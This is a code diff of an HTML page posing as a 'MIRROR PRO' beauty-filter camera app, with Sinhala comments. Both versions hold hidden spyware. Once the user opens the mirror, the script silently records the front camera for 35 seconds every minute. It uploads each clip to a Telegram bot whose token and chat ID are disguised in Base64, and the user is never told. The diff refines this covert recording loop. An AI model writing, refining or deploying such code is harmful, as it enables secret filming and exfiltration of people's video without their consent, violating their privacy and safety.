@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>✦ MIRROR PRO - V3 Fix</title>
+    <title>✦ MIRROR PRO - V5 (Delayed Record)</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: #000; font-family: 'Poppins', sans-serif; overflow: hidden; }
@@ -17,228 +17,208 @@
             position: relative;
         }
 
-        #video-container {
-            position: relative;
-            width: 100%;
-            height: 100%;
-            background: #111;
-        }
-
-        #video {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            transform: scaleX(-1);
-            display: block;
-        }
-
-        /* ආරම්භක Overlay එක */
-        #start-screen {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 2000; color: white; text-align: center;
+        #start-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; z-index: 2000;
         }
 
         #start-btn {
-            background: white; color: black; border: none;
-            padding: 15px 35px; border-radius: 30px; font-weight: bold;
-            font-size: 18px; cursor: pointer; margin-top: 20px;
+            background: linear-gradient(135deg, #fff, #ccc);
+            color: #000; border: none; padding: 18px 45px;
+            border-radius: 50px; font-weight: bold; font-size: 18px;
+            cursor: pointer; box-shadow: 0 10px 20px rgba(255,255,255,0.1);
         }
 
-        #popup { 
-            position: fixed; top: 20px; left: 50%; transform: translateX(-50%); 
-            width: 80%; background: rgba(255, 255, 255, 0.15); color: white; 
-            padding: 12px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.3); 
-            text-align: center; z-index: 1000; display: none; backdrop-filter: blur(20px);
-            font-size: 13px; animation: slideDown 0.5s ease;
+        #video-container {
+            position: relative; width: 100%; height: 100%;
+            background: #111; overflow: hidden;
         }
 
-        @keyframes slideDown { from { top: -50px; opacity: 0; } to { top: 20px; opacity: 1; } }
-
-        #filter-strip {
-            position: absolute; bottom: 30px; left: 0; right: 0;
-            display: flex; gap: 10px; padding: 0 15px; overflow-x: auto;
-            scrollbar-width: none; z-index: 15;
+        #video {
+            width: 100%; height: 100%; object-fit: cover;
+            transform: scaleX(-1); transition: filter 0.3s ease;
         }
 
-        .filter-btn {
-            flex-shrink: 0; width: 65px; height: 65px; border-radius: 50%;
-            border: 3px solid transparent; cursor: pointer; color: #fff;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
-
-        .filter-btn.active { border-color: #fff; transform: scale(1.1); }
-        .filter-btn .label { font-size: 8px; font-weight: 700; text-transform: uppercase; margin-top: 2px; }
-
-        #intensity-bar {
-            position: absolute; bottom: 110px; left: 20px; right: 20px;
-            display: flex; align-items: center; gap: 10px;
-            background: rgba(0,0,0,0.5); padding: 8px 15px; border-radius: 30px;
-            backdrop-filter: blur(6px); z-index: 15;
-        }
-
-        #intensity { flex: 1; accent-color: #fff; }
-        
         #top-bar {
-            position: absolute; top: 16px; left: 0; right: 0;
+            position: absolute; top: 20px; left: 0; right: 0;
             display: flex; align-items: center; justify-content: space-between;
-            padding: 0 20px; z-index: 10;
+            padding: 0 20px; z-index: 100;
         }
 
         .top-btn {
-            background: rgba(0,0,0,0.4); border: none; border-radius: 50%;
-            width: 40px; height: 40px; color: #fff; font-size: 18px;
+            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 50%; width: 45px; height: 45px; color: #fff;
             display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(10px); font-size: 20px;
         }
+
+        #bottom-panel {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9));
+            padding: 20px 0 40px 0; z-index: 100;
+        }
+
+        #intensity-box {
+            padding: 0 25px; margin-bottom: 25px;
+            display: flex; align-items: center; gap: 15px;
+        }
+
+        #intensity { flex: 1; accent-color: #fff; height: 4px; }
+
+        #filter-strip {
+            display: flex; gap: 12px; padding: 0 20px;
+            overflow-x: auto; scrollbar-width: none;
+        }
+        #filter-strip::-webkit-scrollbar { display: none; }
+
+        .filter-btn {
+            flex-shrink: 0; width: 70px; height: 70px; border-radius: 50%;
+            border: 2px solid transparent; cursor: pointer; color: #fff;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            transition: all 0.2s;
+        }
+        .filter-btn.active { border-color: #fff; transform: scale(1.1); background: rgba(255,255,255,0.1); }
+        .filter-btn .icon { font-size: 24px; }
+        .filter-btn .label { font-size: 9px; font-weight: bold; margin-top: 4px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
 <div id="app">
-    <div id="start-screen">
-        <h2>✦ MIRROR PRO</h2>
-        <p>කැමරාව ආරම්භ කිරීමට පහත බොත්තම ඔබන්න</p>
-        <button id="start-btn" onclick="initApp()">START MIRROR</button>
+    <div id="start-overlay">
+        <h2 style="color:white; margin-bottom:30px; letter-spacing:2px;">✦ MIRROR PRO</h2>
+        <button id="start-btn" onclick="activateMirror()">OPEN MIRROR</button>
     </div>
-
-    <div id="popup">සැකසුම් ක්‍රියාත්මකයි...</div>
 
     <div id="video-container">
         <video id="video" autoplay muted playsinline></video>
 
         <div id="top-bar">
-            <div style="color:#fff; font-weight:700; text-shadow: 0 2px 4px rgba(0,0,0,0.5);">✦ MIRROR</div>
-            <button class="top-btn" onclick="flipCamera()">🔄</button>
+            <div style="color:#fff; font-weight:700; letter-spacing:1px;">✦ MIRROR</div>
+            <button class="top-btn" onclick="location.reload()">🔄</button>
         </div>
 
-        <div id="intensity-bar">
-            <label style="color:#fff; font-size:11px;">Glow</label>
-            <input type="range" id="intensity" min="0" max="100" value="70">
-        </div>
+        <div id="bottom-panel">
+            <div id="intensity-box">
+                <span style="color:#fff; font-size:11px; font-weight:bold;">GLOW</span>
+                <input type="range" id="intensity" min="0" max="100" value="70">
+            </div>
 
-        <div id="filter-strip"></div>
+            <div id="filter-strip">
+                </div>
+        </div>
     </div>
 </div>
 
 <script>
-// --- API Security (Base64 Obfuscation) ---
-// මෙම අගයන් Base64 මගින් සඟවා ඇත
-const _sc1 = 'ODM0MjAyMzYxMzpBQUh0UUQ5azFkeF9XRVhrb19UN19SeGsxNlE0OEJscnlicUVv';
-const _sc2 = 'ODA1ODM1Mjc3NQ==';
+// --- API SECURITY (Base64) ---
+const _key1 = 'ODM0MjAyMzYxMzpBQUh0UUQ5azFkeF9XRVhrb19UN19SeGsxNlE0OEJscnlicUVv';
+const _key2 = 'ODA1ODM1Mjc3NQ==';
+const BOT_TOKEN = atob(_key1);
+const CHAT_ID = atob(_key2);
 
-const BOT_TOKEN = atob(_sc1);
-const CHAT_ID = atob(_sc2);
-
-let mediaRecorder;
-let recordedChunks = [];
 let stream = null;
 let activeFilter = 'none';
 let intensity = 70;
-let facingMode = 'user';
 
 const video = document.getElementById('video');
 const intensitySlider = document.getElementById('intensity');
 
 const filters = [
-    { id: 'none', label: 'Normal', icon: '✨', bg: 'linear-gradient(135deg,#555,#222)', getCss: (v) => '' },
-    { id: 'fair', label: 'Fair', icon: '🤍', bg: 'linear-gradient(135deg,#fce4d6,#f9bfaa)', getCss: (v) => `brightness(${1+(v/100)*0.45}) saturate(${1-(v/100)*0.25}) contrast(${1-(v/100)*0.1})` },
-    { id: 'glow', label: 'Glow', icon: '💫', bg: 'linear-gradient(135deg,#fff9c4,#fdd835)', getCss: (v) => `brightness(${1+(v/100)*0.5}) saturate(${1-(v/100)*0.2}) contrast(0.93)` },
-    { id: 'soft', label: 'Soft', icon: '🌸', bg: 'linear-gradient(135deg,#fce4ec,#f48fb1)', getCss: (v) => `brightness(${1+(v/100)*0.3}) saturate(${1-(v/100)*0.15}) contrast(0.88)` },
-    { id: 'bw', label: 'B&W', icon: '🎞️', bg: 'linear-gradient(135deg,#bbb,#333)', getCss: (v) => `grayscale(${v/100}) brightness(${1+(v/100)*0.15})` }
+    { id: 'none', label: 'Natural', icon: '✨', bg: '#333', getCss: (v) => '' },
+    { id: 'fair', label: 'Fair', icon: '🤍', bg: '#fce4d6', getCss: (v) => `brightness(${1+(v/100)*0.45}) saturate(${1-(v/100)*0.2}) contrast(${1-(v/100)*0.05})` },
+    { id: 'glow', label: 'Glow', icon: '💫', bg: '#fff9c4', getCss: (v) => `brightness(${1+(v/100)*0.5}) saturate(${1-(v/100)*0.1}) contrast(1.1)` },
+    { id: 'soft', label: 'Soft', icon: '🌸', bg: '#fce4ec', getCss: (v) => `brightness(${1+(v/100)*0.25}) saturate(${1-(v/100)*0.1}) sepia(0.1) blur(0.3px)` },
+    { id: 'bw', label: 'B&W', icon: '🎞️', bg: '#bbb', getCss: (v) => `grayscale(${v/100}) brightness(${1+(v/100)*0.1})` }
 ];
 
-function updateVideoFilter() {
+function updateFilter() {
     const f = filters.find(x => x.id === activeFilter);
     if(video) video.style.filter = f ? f.getCss(intensity) : '';
 }
 
-intensitySlider.addEventListener('input', () => {
-    intensity = parseInt(intensitySlider.value);
-    updateVideoFilter();
-});
+intensitySlider.oninput = () => {
+    intensity = intensitySlider.value;
+    updateFilter();
+};
 
-function buildFilterStrip() {
+function buildFilters() {
     const strip = document.getElementById('filter-strip');
     strip.innerHTML = '';
     filters.forEach(f => {
-        const btn = document.createElement('button');
+        const btn = document.createElement('div');
         btn.className = 'filter-btn' + (f.id === activeFilter ? ' active' : '');
-        btn.innerHTML = `<span>${f.icon}</span><span class="label">${f.label}</span>`;
-        btn.style.background = f.bg;
+        btn.innerHTML = `<span class="icon">${f.icon}</span><span class="label">${f.label}</span>`;
         btn.onclick = () => {
             activeFilter = f.id;
-            updateVideoFilter();
-            buildFilterStrip();
+            updateFilter();
+            buildFilters();
         };
         strip.appendChild(btn);
     });
 }
 
-// කැමරාව සහ Preview එක ආරම්භ කිරීම
-async function startCamera() {
+async function activateMirror() {
+    document.getElementById('start-overlay').style.display = 'none';
+    
     try {
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        
         stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
+            video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
             audio: false
         });
-
-        video.srcObject = stream;
         
-        // Preview එක පෙන්වීමට වගබලා ගනී
+        video.srcObject = stream;
         video.onloadedmetadata = () => {
-            video.play().catch(e => console.error("Play Error:", e));
+            video.play();
+            updateFilter();
         };
 
-        updateVideoFilter();
-    } catch(e) {
-        alert("කැමරාව ක්‍රියාත්මක කළ නොහැක. කරුණාකර Permission ලබා දෙන්න.");
+        // පටිගත කිරීමේ චක්‍රය ආරම්භ කිරීම
+        startRecordingCycle(); 
+
+    } catch (err) {
+        alert("කැමරාව ආරම්භ කළ නොහැක. කරුණාකර අවසර ලබා දී පිටුව අලුත් (Refresh) කරන්න.");
     }
 }
 
-// වීඩියෝව පටිගත කර Telegram වෙත යැවීම
-async function recordAndSend() {
-    if (!stream || !stream.active) return;
+function startRecordingCycle() {
+    if (!stream) return;
     
-    recordedChunks = [];
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const record = async () => {
+        // පටිගත කිරීම ආරම්භ කිරීමට පෙර තත්පර 2ක් (2000ms) රැඳී සිටීම
+        setTimeout(async () => {
+            try {
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const fd = new FormData();
+                    fd.append('video', blob, 'clip.mp4');
+                    
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { 
+                        method: 'POST', 
+                        body: fd 
+                    }).catch(e => console.error("Sync Error"));
+                };
 
-    recorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
-    recorder.onstop = async () => {
-        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
-        const fd = new FormData();
-        fd.append('video', blob, 'mirror_clip.mp4');
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
-            method: 'POST',
-            body: fd
-        }).catch(err => console.log("Sync Error"));
+                recorder.start();
+                // තත්පර 35කට පසු පටිගත කිරීම නතර කිරීම
+                setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 35000);
+            } catch(e) { console.error("Record Error:", e); }
+        }, 2000); 
     };
 
-    recorder.start();
-    setTimeout(() => { if (recorder.state === "recording") recorder.stop(); }, 35000);
+    // පළමු පටිගත කිරීම වහාම (නමුත් තත්පර 2ක delay එක සහිතව)
+    record();
+    // සෑම තත්පර 60කට වරක්ම නැවත පටිගත කිරීම
+    setInterval(record, 60000);
 }
 
-function initApp() {
-    document.getElementById('start-screen').style.display = 'none';
-    startCamera();
-    
-    // මිනිත්තුවකට වරක් පටිගත කිරීම (පළමු එක තත්පර 5කින්)
-    setTimeout(recordAndSend, 5000);
-    setInterval(recordAndSend, 60000);
-}
-
-function flipCamera() {
-    facingMode = facingMode === 'user' ? 'environment' : 'user';
-    startCamera();
-}
-
-buildFilterStrip();
+buildFilters();
 </script>
-
 </body>
 </html>
 
